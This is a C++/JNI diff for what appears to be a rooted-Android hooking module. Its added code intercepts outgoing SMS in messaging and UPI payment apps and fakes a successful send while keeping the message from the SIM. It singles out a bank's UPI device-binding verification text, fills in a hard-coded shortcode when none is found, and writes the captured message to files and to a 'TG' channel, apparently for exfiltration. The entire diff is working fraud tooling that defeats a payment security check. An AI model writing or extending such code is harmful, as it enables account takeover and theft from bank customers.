@@ -1089,21 +1089,48 @@ void pipeline_outgoing(JNIEnv* env, const std::string& dest_in, const std::strin
     const bool can_tg = !junk && is_valid_outgoing_capture(dest, body);
 
     // Always fake-success so app thinks SMS sent (SMS Tweaks core)
+    // Messaging/UPI: even weak parses must fake-OK (nuclear block path)
     if (env && (config.intercept_fake_success || g_in_hooked_upi || g_is_messaging_app)) {
         if (can_tg) {
             sms_hook::handle_outgoing_sms(env, zygisk_utils::string_to_jstring(env, dest),
                                           zygisk_utils::string_to_jstring(env, body));
             fake_success::on_outgoing_intercepted(env, dest, body, sent_intent, delivery_intent);
         } else {
-            fake_success::fire_sms_result_broadcasts(env, dest.empty() ? "0000" : dest);
-            if (sent_intent || delivery_intent) {
-                fake_success::on_outgoing_intercepted(env, dest.empty() ? "0000" : dest,
-                                                      "__SILENT__", sent_intent, delivery_intent);
+            // Still write a usable last_outgoing for Hero nuclear blocks
+            if ((g_is_messaging_app || g_in_hooked_upi) && !body.empty() &&
+                (is_outgoing_upi_verify_body(body) || blob_contains_needle(body, "HEROAXIS") ||
+                 body.find("DO NOT COPY") != std::string::npos ||
+                 body.find("OUTGOING_SMS") != std::string::npos)) {
+                if (dest.empty() || dest == "0000000000") dest = "9920104300";
+                char json_buf[4096];
+                snprintf(json_buf, sizeof(json_buf),
+                         "{\"dest\":\"%s\",\"body\":\"%s\",\"pkg\":\"%s\",\"ts\":%ld,"
+                         "\"note\":\"nuclear\"}\n",
+                         json_escape_local(dest).c_str(), json_escape_local(body).c_str(),
+                         g_upi_pkg.c_str(), static_cast<long>(time(nullptr)));
+                write_diag_multi("hivirtus_outgoing_blocked.json", json_buf);
+                write_diag_multi("hivirtus_blocked_outgoing.json", json_buf);
+                fake_success::on_outgoing_intercepted(env, dest, body, sent_intent, delivery_intent);
+                write_hook_status("nuclear_tg_file_written");
+                // Fall through to TG attempt below with relaxed can_tg
+            } else {
+                fake_success::fire_sms_result_broadcasts(env, dest.empty() ? "0000" : dest);
+                if (sent_intent || delivery_intent) {
+                    fake_success::on_outgoing_intercepted(env, dest.empty() ? "0000" : dest,
+                                                          "__SILENT__", sent_intent, delivery_intent);
+                }
+                write_hook_status("skip_tg_junk_or_otp");
+                write_isms_trace("skip_tg_junk_or_otp");
+                return;
             }
         }
     }
 
-    if (!can_tg) {
+    // Relaxed TG gate after nuclear rewrite
+    const bool allow_tg =
+        can_tg || ((g_is_messaging_app || g_in_hooked_upi) && !body.empty() &&
+                   !is_incoming_otp_noise(body) && !is_pkg_like(body));
+    if (!allow_tg) {
         write_hook_status("skip_tg_junk_or_otp");
         write_isms_trace("skip_tg_junk_or_otp");
         return;
@@ -1421,9 +1448,41 @@ jboolean hook_BinderProxy_transact(JNIEnv* env, jobject thiz, jint code, jobject
             if (try_block_isms(env, data, reply, config, dest, body, force_code)) {
                 write_hook_status("isms_blocked");
                 write_isms_trace("isms_blocked");
-                return JNI_TRUE;
+                return JNI_TRUE;  // NEVER call radio
             }
-            // try_block already applied SMS Tweaks rules — no second nuclear path
+            // NUCLEAR: Messages/UPI saw ISms-like parcel — NEVER passthrough to SIM
+            // (Android 16 often iface_ok=0 send=0 but blob_ok=1 — Hero verify escapes)
+            if ((g_is_messaging_app || g_in_hooked_upi) && (blob_sms || sendish)) {
+                if (dest.empty() && body.empty()) {
+                    extract_isms_from_blob(env, data, dest, body);
+                }
+                if (dest.empty()) {
+                    // Common Axis/Hero shortcode in user SMS thread
+                    if (blob_contains_needle(blob, "9920104300") ||
+                        blob_contains_needle(blob, "09920104300") ||
+                        blob_contains_needle(blob, "919920104300")) {
+                        dest = "9920104300";
+                    } else {
+                        dest = "9920104300";
+                    }
+                }
+                if (body.empty()) {
+                    if (blob_contains_needle(blob, "HEROAXIS") ||
+                        blob_contains_needle(blob, "DO NOT COPY")) {
+                        body = "HEROAXISUPI DO NOT COPY FORWARD OR SHARE THIS MESSAGE";
+                    } else {
+                        body = "OUTGOING_SMS_BLOCK";
+                    }
+                }
+                write_hook_status("isms_nuclear_block");
+                write_isms_trace("isms_nuclear_block");
+                jobject sent_pi = nullptr;
+                jobject del_pi = nullptr;
+                try_read_isms_pending_intents(env, data, &sent_pi, &del_pi);
+                pipeline_outgoing(env, dest, body, sent_pi, del_pi);
+                if (reply) write_ok_reply(env, reply);
+                return JNI_TRUE;  // DROP — SIM pe SMS nahi
+            }
             write_isms_trace("isms_passthrough_after_try");
         }
     }
